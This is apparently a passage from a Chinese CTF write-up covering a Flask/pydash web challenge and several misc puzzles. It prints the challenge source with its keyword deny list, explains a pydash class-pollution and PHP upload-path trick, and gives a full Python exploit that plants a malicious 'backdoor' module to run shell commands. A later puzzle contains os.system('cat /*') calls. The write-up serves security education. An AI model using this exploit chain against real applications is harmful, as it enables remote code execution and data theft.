+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, request<br><span class="hljs-keyword">from</span> challenge <span class="hljs-keyword">import</span> challenge<br><span class="hljs-keyword">import</span> re<br><br>app = Flask(__name__)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">check</span>(<span class="hljs-params">value: <span class="hljs-built_in">str</span></span>):<br>    black_list = [<span class="hljs-string">&quot;app&quot;</span>, <span class="hljs-string">&quot;_static_folder&quot;</span>, <span class="hljs-string">&quot;pardir&quot;</span>, <span class="hljs-string">&quot;os&quot;</span>,<br>                  <span class="hljs-string">&quot;env&quot;</span>, <span class="hljs-string">&quot;jinja&quot;</span>, <span class="hljs-string">&quot;modules&quot;</span>, <span class="hljs-string">&quot;exported&quot;</span>,<span class="hljs-string">&quot;loader&quot;</span>,<span class="hljs-string">&quot;__spec__&quot;</span>]<br>    <span class="hljs-keyword">if</span> re.findall(<span class="hljs-string">&quot;r&#x27;[^\w\.\[\]]&#x27;&quot;</span>, value):<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> black_list:<br>            <span class="hljs-keyword">if</span> i <span class="hljs-keyword">in</span> value:<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/app/set&quot;</span>, methods=[<span class="hljs-string">&quot;POST&quot;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">set</span>():<br>    key, value = request.json.get(<span class="hljs-string">&#x27;key&#x27;</span>), request.json.get(<span class="hljs-string">&#x27;value&#x27;</span>)<br><br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> key <span class="hljs-keyword">or</span> <span class="hljs-built_in">type</span>(key) != <span class="hljs-built_in">str</span>:<br>        <span class="hljs-keyword">return</span> &#123;<span class="hljs-string">&quot;message&quot;</span>: <span class="hljs-string">&quot;Not key or key must be str&quot;</span>&#125;, <span class="hljs-number">400</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(key) &gt; <span class="hljs-number">100</span>:<br>        <span class="hljs-keyword">return</span> &#123;<span class="hljs-string">&quot;message&quot;</span>: <span class="hljs-string">&quot;Key may be too long!&quot;</span>&#125;, <span class="hljs-number">400</span><br>    <span class="hljs-keyword">if</span> value <span class="hljs-keyword">and</span> <span class="hljs-built_in">len</span>(value) &gt; <span class="hljs-number">20</span>:<br>        <span class="hljs-keyword">return</span> &#123;<span class="hljs-string">&quot;message&quot;</span>: <span class="hljs-string">&quot;Value may  be too long!&quot;</span>&#125;, <span class="hljs-number">400</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> value:<br>        game.complete(value)<br>        <span class="hljs-keyword">return</span> &#123;<span class="hljs-string">&quot;message&quot;</span>: <span class="hljs-string">&quot;Key set success !&quot;</span>&#125;, <span class="hljs-number">200</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">type</span>(value) != <span class="hljs-built_in">str</span>:<br>        <span class="hljs-keyword">return</span> &#123;<span class="hljs-string">&quot;message&quot;</span>: <span class="hljs-string">&quot;Value must be a string!&quot;</span>&#125;, <span class="hljs-number">400</span><br><br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> check(key):<br>        <span class="hljs-built_in">print</span>(key)<br>        <span class="hljs-keyword">return</span> &#123;<span class="hljs-string">&quot;message&quot;</span>: <span class="hljs-string">&quot;Hacker!&quot;</span>&#125;, <span class="hljs-number">400</span><br><br>    <span class="hljs-comment"># pydash?</span><br>    <span class="hljs-keyword">if</span> game.<span class="hljs-built_in">set</span>(key, value):<br>        <span class="hljs-keyword">return</span> &#123;<span class="hljs-string">&quot;message&quot;</span>: <span class="hljs-string">&quot;Task updated!&quot;</span>&#125;, <span class="hljs-number">200</span><br>    <span class="hljs-keyword">return</span> &#123;<span class="hljs-string">&quot;message&quot;</span>: <span class="hljs-string">&quot;Invalid task name!&quot;</span>&#125;, <span class="hljs-number">400</span><br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/app/&quot;</span>, methods=[<span class="hljs-string">&quot;GET&quot;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_source</span>():<br>    fp = <span class="hljs-built_in">open</span>(__file__)<br>    res = fp.read()<br>    fp.close<br>    <span class="hljs-keyword">return</span> res.replace(<span class="hljs-string">&quot; &quot;</span>, <span class="hljs-string">&quot; &quot;</span>).replace(<span class="hljs-string">&quot;\n&quot;</span>, <span class="hljs-string">&quot;</span><br><span class="hljs-string">&quot;</span>)<br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/app/get&quot;</span>, methods=[<span class="hljs-string">&quot;GET&quot;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_date</span>():<br>    <span class="hljs-keyword">import</span> backdoor<br>    flag = backdoor.backdoor()<br>    sys.modules.pop(<span class="hljs-string">&quot;backdoor&quot;</span>)<br>    <span class="hljs-keyword">return</span> flag<br><br><br>game = challenge()<br>app.run(<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>, <span class="hljs-number">3000</span>)<br></code></pre></td></tr></table></figure>
+
+<p>其中有三个路由</p>
+<p><code>/app</code>显示当前代码<br><code>/app/get</code>存在后门，有导入包的操作<br><code>/app/set</code>用于设置键值对</p>
+<p>其中存在提示<code># pydash?</code>，表示通过<code>pydash</code>设置属性，而<code>pydash</code>低版本存在类污染，可以利用<code>pydash.set</code>来设置或覆盖属性值，也可以设置路径</p>
+<p>在<code>/app/get</code>路由中存在一个<code>import</code>的操作，当<code>Python</code>解释器遇到<code>import</code>语句时，它会在<code>sys.path</code>变量中指定的路径中搜索模块，其中<code>sys.path[0]</code>则表示最初调用<code>Python</code>解释器的脚本所在的绝对路径</p>
+<p>所以我们可以上传一个名称为<code>backdoor</code>的py文件，再利用<code>pydash.set</code>覆盖<code>sys.path[0]</code>的值，使其寻找包时找到我们的恶意包</p>
+<p>同时题目中还存在一个waf</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">black_list = [<span class="hljs-string">&quot;app&quot;</span>, <span class="hljs-string">&quot;_static_folder&quot;</span>, <span class="hljs-string">&quot;pardir&quot;</span>, <span class="hljs-string">&quot;os&quot;</span>,<br>                  <span class="hljs-string">&quot;env&quot;</span>, <span class="hljs-string">&quot;jinja&quot;</span>, <span class="hljs-string">&quot;modules&quot;</span>, <span class="hljs-string">&quot;exported&quot;</span>,<span class="hljs-string">&quot;loader&quot;</span>,<span class="hljs-string">&quot;__spec__&quot;</span>]<br></code></pre></td></tr></table></figure>
+
+<p>可以利用<code>pydash.helpers</code>导入<code>inspect</code>来绕过</p>
+<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/2023nsctf/easy_upload-2.png"></p>
+<p>还有一点要注意，上传时对<code>$type</code>进行了检查，不允许上传<code>py</code>类型的文件，但是<code>$type</code>的值是可控的，我们可以将其置空</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//line 32</span><br><span class="hljs-variable">$newFile</span> = <span class="hljs-variable">$res</span> . <span class="hljs-variable">$file_path</span> . <span class="hljs-string">&quot;.<span class="hljs-subst">&#123;$type&#125;</span>&quot;</span>;<br></code></pre></td></tr></table></figure>
+
+<p>如果<code>$type</code>为空，就会在文件尾加一个点，例如<code>backdoor.py.</code></p>
+<p>这里可以用<code>file_put_contents</code>的一个<code>trick</code>绕过，如图</p>
+<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/2023nsctf/easy_upload-3.png"></p>
+<p>例如<code>backdoor.py/.</code>，<code>file_put_contents</code>会自已给标准化成绝对路径</p>
+<p>exp</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> base64<br><br>url = <span class="hljs-string">&quot;x.x.x.x&quot;</span><br>shell = <span class="hljs-string">&#x27;&#x27;&#x27;import os</span><br><span class="hljs-string">def backdoor():</span><br><span class="hljs-string">    return os.popen(&quot;cat /flag&quot;).read()</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">exploit</span>():<br>    data = <span class="hljs-string">&quot;data:image/;base64,&quot;</span> + base64.b64encode(shell.encode()).decode()<br>    start = <span class="hljs-built_in">int</span>(time.time())<br>    res = requests.post(<br>        url=url+<span class="hljs-string">&quot;index.php?action=base64&amp;path=backdoor.py/&quot;</span>, data=data)<br>    end = <span class="hljs-built_in">int</span>(time.time())<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(start, end+<span class="hljs-number">2</span>):<br>        <span class="hljs-built_in">print</span>(i)<br>        data = &#123;<br>            <span class="hljs-string">&quot;key&quot;</span>: <span class="hljs-string">&quot;__init__.__globals__.pydash.helpers.inspect.sys.path[0]&quot;</span>,<br>            <span class="hljs-string">&quot;value&quot;</span>: <span class="hljs-string">&quot;/tmp/%s/&quot;</span> % (i)<br>        &#125;<br>        <span class="hljs-built_in">print</span>(data)<br>        requests.post(url=url+<span class="hljs-string">&quot;app/set&quot;</span>,json=data)<br>        res = requests.get(url=url+<span class="hljs-string">&quot;app/get&quot;</span>)<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;flag??&quot;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> res.text <span class="hljs-keyword">and</span> res.status_code != <span class="hljs-number">500</span>:<br>            <span class="hljs-built_in">print</span>(res.text)<br>            <span class="hljs-keyword">break</span><br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">print</span>(res.text)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    exploit()<br></code></pre></td></tr></table></figure>
+
+
+
+
+
+<h1 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h1><h2 id="zip"><a href="#zip" class="headerlink" title="zip"></a>zip</h2><p>zip注释：<code>The art of 0 and 1, and it will remain shorter than 9.</code></p>
+<p>生成字典</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python">my_dict = &#123;&#125;<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">10</span>):<br>    bin_strings = [<span class="hljs-built_in">bin</span>(j)[<span class="hljs-number">2</span>:].zfill(i) <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">2</span>**i)]<br>    my_dict[i] = bin_strings<br><span class="hljs-keyword">for</span> key,value <span class="hljs-keyword">in</span> my_dict.items():<br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;dic.txt&#x27;</span>,<span class="hljs-string">&#x27;a+&#x27;</span>)<span class="hljs-keyword">as</span> f:<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> value:<br>            f.write(i+<span class="hljs-string">&#x27;\n&#x27;</span>)<br><br></code></pre></td></tr></table></figure>
+
+<p>爆破得到密码<code>01001101</code></p>
+<p>解压得到flag</p>
+<h2 id="SimpleDocument"><a href="#SimpleDocument" class="headerlink" title="SimpleDocument"></a>SimpleDocument</h2><p>图片分离出一个pdf，用pdf编辑器全选，发现有一个隐藏的文本</p>
+<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/2023nsctf/SimpleDocument.png"></p>
+<h2 id="BeautifulImage"><a href="#BeautifulImage" class="headerlink" title="BeautifulImage"></a>BeautifulImage</h2><p>stegsolve分析，0通道藏有base加密字符串</p>
+<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/2023nsctf/BeautifulImage.png"></p>
+<h2 id="tree"><a href="#tree" class="headerlink" title="tree"></a>tree</h2><p>下载附件得到一个<code>tree.py</code>，约有60w行代码</p>
+<p>部分代码如下</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> os<br><br><span class="hljs-comment"># the o mean is 0!</span><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">tree_0aB30386</span>():<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">tree_o02aA7B4</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">if</span> -<span class="hljs-number">1705</span> &lt; <span class="hljs-number">2926</span>:<br>            tree_b270co58.tree_f79D6eB3(self)<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">tree_51o1oA3a</span>():<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">tree_433218o8</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">if</span> <span class="hljs-number">1793</span> &lt; -<span class="hljs-number">5366</span>:<br>            tree_B813Fe08.tree_AaA1b735(self)<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">tree_2598o3do</span>():<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">tree_7C0ooB75</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">if</span> -<span class="hljs-number">7226</span> &gt; -<span class="hljs-number">7705</span>:<br>            tree_3482o9ob.tree_0d6aDA0F(self)<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">tree_0a351C93</span>():<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">tree_39cD9171</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">if</span> <span class="hljs-number">9865</span> &lt; <span class="hljs-number">592</span>:<br>            tree_Coc29fcC.tree_22E98104(self)<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">tree_170EE546</span>():<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">tree_70759F44</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">if</span> -<span class="hljs-number">8714</span> &lt; <span class="hljs-number">4093</span>:<br>            tree_8D0oE9Cf.tree_2F7682e6(self)<br></code></pre></td></tr></table></figure>
+
+<p>且存在部分函数调用<code>os.system</code>，执行的语句均为<code>cat /*</code></p>
+<p>除了<code>os</code>函数外，其他函数都存在一个<code>if</code>，判断成功时引用下一个类</p>
+<p>例如：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> random<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> ast<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">tree_91fo80eD</span>():<br>   <span class="hljs-keyword">def</span> <span class="hljs-title function_">tree_7040e9o9</span>(<span class="hljs-params">self</span>):<br>       os.system(<span class="hljs-string">&#x27;cat /*&#x27;</span>)<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">tree_88eF054e</span>():<br>   <span class="hljs-keyword">def</span> <span class="hljs-title function_">tree_o00o0b68</span>(<span class="hljs-params">self</span>):<br>       tree_91fo80eD.tree_7040e9o9(self)<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">tree_1a0c10D0</span>():<br>   <span class="hljs-keyword">def</span> <span class="hljs-title function_">tree_4Cc0o1Do</span>(<span class="hljs-params">self</span>):<br>       tree_88eF054e().tree_o00o0b68(self)<br></code></pre></td></tr></table></figure>
+
+<p>这段代码的完整利用链为：<br><code>tree_1a0c10D0.tree_4Cc0o1Do() -&gt; tree_88eF054e.tree_o00o0b68() -&gt; tree_91fo80eD.tree_7040e9o9()</code></p>
+<p>所以我们需要分析代码，找到最终触发<code>os.system</code>的利用链，并提取出来</p>
+<p>同时对所有<code>os.system</code>语句标记污点，如果遇到<code>if</code>判断错误的，则直接取消污点标记，并一直往上寻找最终利用链，并记录类名、函数名和函数内的具体内容</p>
+<p>根据提示<code># the o mean is 0!</code>，提取所有完整利用链的类名的后8位十六进制字符，并将o转化为0</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> ast<br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> astor<br><br><span class="hljs-comment"># 解析Python文件，获取语法树</span><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;tree.py&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>) <span class="hljs-keyword">as</span> file:<br>   source_code = file.read()<br>syntax_tree = ast.parse(source_code)<br><br><span class="hljs-comment"># 初始化类名和函数字典</span><br>class_dict = &#123;&#125;<br><br><span class="hljs-comment"># 遍历语法树，获取类和函数名</span><br><span class="hljs-keyword">for</span> node <span class="hljs-keyword">in</span> syntax_tree.body:<br>   <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(node, ast.ClassDef):<br>       class_name = node.name<br>       class_dict[class_name] = &#123;&#125;<br>       <span class="hljs-keyword">for</span> inner_node <span class="hljs-keyword">in</span> node.body:<br>           <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(inner_node, ast.FunctionDef):<br>               func_name = inner_node.name<br>               class_dict[class_name][func_name] = []<br>               <span class="hljs-keyword">for</span> code <span class="hljs-keyword">in</span> inner_node.body:<br>                   class_dict[class_name][func_name].append(astor.to_source(code).strip())<br><br><span class="hljs-comment"># 输出结果</span><br><br>class_keys = []<br><span class="hljs-keyword">for</span> func_dict <span class="hljs-keyword">in</span> class_dict.items():<br>   <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;os.system&#x27;</span> <span class="hljs-keyword">in</span> <span class="hljs-built_in">str</span>(func_dict):<br>       sub = func_dict[<span class="hljs-number">1</span>][<span class="hljs-built_in">list</span>(func_dict[<span class="hljs-number">1</span>].items())[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>]][<span class="hljs-number">0</span>].split(<span class="hljs-string">&#x27;\n&#x27;</span>)[<span class="hljs-number">0</span>].split(<span class="hljs-string">&#x27; &#x27;</span>)<br>       <span class="hljs-keyword">if</span> sub[<span class="hljs-number">2</span>] == <span class="hljs-string">&#x27;&gt;&#x27;</span>:<br>           <span class="hljs-keyword">if</span> <span class="hljs-built_in">int</span>(sub[<span class="hljs-number">1</span>]) &lt; <span class="hljs-built_in">int</span>(sub[<span class="hljs-number">3</span>][:-<span class="hljs-number">1</span>]):<br>               <span class="hljs-keyword">continue</span><br>       <span class="hljs-keyword">elif</span> sub[<span class="hljs-number">2</span>] == <span class="hljs-string">&#x27;&lt;&#x27;</span>:<br>           <span class="hljs-keyword">if</span> <span class="hljs-built_in">int</span>(sub[<span class="hljs-number">1</span>]) &gt; <span class="hljs-built_in">int</span>(sub[<span class="hljs-number">3</span>][:-<span class="hljs-number">1</span>]):<br>               <span class="hljs-keyword">continue</span><br>       class_keys.append(func_dict[<span class="hljs-number">0</span>])<br><br><span class="hljs-keyword">for</span> key <span class="hljs-keyword">in</span> class_keys:<br>   class_key = key<br>   func_key = <span class="hljs-built_in">list</span>(class_dict[class_key])[<span class="hljs-number">0</span>]<br>   list_class = [class_key]<br>   flag = <span class="hljs-number">1</span><br>   flags = <span class="hljs-number">0</span><br>   <span class="hljs-keyword">while</span> flag != <span class="hljs-number">0</span> <span class="hljs-keyword">and</span> flags == <span class="hljs-number">0</span>:<br>       flag = <span class="hljs-number">1</span><br>       flags = <span class="hljs-number">0</span><br>       <span class="hljs-keyword">for</span> func_dict <span class="hljs-keyword">in</span> class_dict.items():<br>           <span class="hljs-keyword">for</span> code <span class="hljs-keyword">in</span> func_dict[<span class="hljs-number">1</span>].items():<br>               <span class="hljs-comment"># print(func_dict[1].items(), flag)</span><br>               <span class="hljs-keyword">if</span> class_key <span class="hljs-keyword">in</span> code[<span class="hljs-number">1</span>][<span class="hljs-number">0</span>] <span class="hljs-keyword">and</span> func_key <span class="hljs-keyword">in</span> code[<span class="hljs-number">1</span>][<span class="hljs-number">0</span>]:<br>                   sub = code[<span class="hljs-number">1</span>][<span class="hljs-number">0</span>].split(<span class="hljs-string">&#x27;\n&#x27;</span>)[<span class="hljs-number">0</span>].split(<span class="hljs-string">&#x27; &#x27;</span>)<br>                   <span class="hljs-keyword">if</span> sub[<span class="hljs-number">2</span>] == <span class="hljs-string">&#x27;&gt;&#x27;</span>:<br>                       <span class="hljs-keyword">if</span> <span class="hljs-built_in">int</span>(sub[<span class="hljs-number">1</span>]) &lt; <span class="hljs-built_in">int</span>(sub[<span class="hljs-number">3</span>][:-<span class="hljs-number">1</span>]):<br>                           flag = -<span class="hljs-number">1</span><br>                   <span class="hljs-keyword">elif</span> sub[<span class="hljs-number">2</span>] == <span class="hljs-string">&#x27;&lt;&#x27;</span>:<br>                       <span class="hljs-keyword">if</span> <span class="hljs-built_in">int</span>(sub[<span class="hljs-number">1</span>]) &gt; <span class="hljs-built_in">int</span>(sub[<span class="hljs-number">3</span>][:-<span class="hljs-number">1</span>]):<br>                           flag = -<span class="hljs-number">1</span><br>                   flags = <span class="hljs-number">2</span><br>                   func_key = code[<span class="hljs-number">0</span>]<br>                   class_key = func_dict[<span class="hljs-number">0</span>]<br>                   <span class="hljs-comment"># print(func_key, class_key)</span><br>                   <span class="hljs-comment"># print(func_key, class_key)</span><br>                   list_class.append(class_key)<br>                   <span class="hljs-comment"># print(list_class)</span><br>       <span class="hljs-keyword">else</span>:<br>           <span class="hljs-comment"># print(flag, flags)</span><br>           <span class="hljs-keyword">if</span> flag == -<span class="hljs-number">1</span>:<br>               flags = <span class="hljs-number">1</span><br>           <span class="hljs-keyword">if</span> flags == <span class="hljs-number">2</span>:<br>               flags = <span class="hljs-number">0</span><br>               <span class="hljs-keyword">continue</span><br>           <span class="hljs-keyword">if</span> flag == <span class="hljs-number">1</span> <span class="hljs-keyword">and</span> flags == <span class="hljs-number">0</span>:<br>               <span class="hljs-keyword">break</span><br>   <span class="hljs-comment"># 将完整利用链的类名，去除tree_，o改为0，按照顺序输出成字符串</span><br>   <span class="hljs-keyword">if</span> flag != -<span class="hljs-number">1</span>:<br>       <span class="hljs-keyword">for</span> cla <span class="hljs-keyword">in</span> list_class:<br>           <span class="hljs-built_in">print</span>(cla[<span class="hljs-number">5</span>:].replace(<span class="hljs-string">&#x27;o&#x27;</span>, <span class="hljs-string">&#x27;0&#x27;</span>), end=<span class="hljs-string">&#x27;&#x27;</span>)<br>       <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;&#x27;</span>)<br></code></pre></td></tr></table></figure>
+
+<p>最终得到两条完整的利用链</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">7468652070617373776f7264206973203730383532613933613336343963613736653335626138353833376566613135<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">377aBCAf271c00041373e10830000000000000006A0000000000000057Acbd47A5c4CDB728a43AF6d91D92D25519Bac7876E97909B633223d3A1d7417A3a741ddAfB0E9A7F0b25C726085149ad1da4D40104060001093000070B0100022406F1070112530f9A96C63163E0Df042FD12EC0b32431902121010001000C2A2600080a017088A4910000050119010011130066006c00610067002e0074007800740000001900140a01008B43f758BE7Ad901150601002000000000000000<br></code></pre></td></tr></table></figure>
+
+<p>转字符串后发现一个为<code>7z</code>文件，一个为<code>the password is 70852a93a3649ca76e35ba85837efa15</code>，解压得到flag</p>
+<h2 id="hacker-traffic"><a href="#hacker-traffic" class="headerlink" title="hacker_traffic"></a>hacker_traffic</h2><p>在第4615条流中发现flag.zip</p>
+<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/2023nsctf/hacker_traffic-1.png"></p>
+<p>注释内容：<code>password is (md5(virus_file) + lhost_ip)</code></p>
+<p>同时发现流量中有很多elf文件，使用tshark或者python提取</p>
+<p>这里使用binwalk，但是需要注意部分binwalk版本不能提取elf文件</p>
+<p>需要修改<code>/usr/lib/python3/dist-packages/binwalk/config/extract.conf</code>文件(以kali默认位置为例)</p>
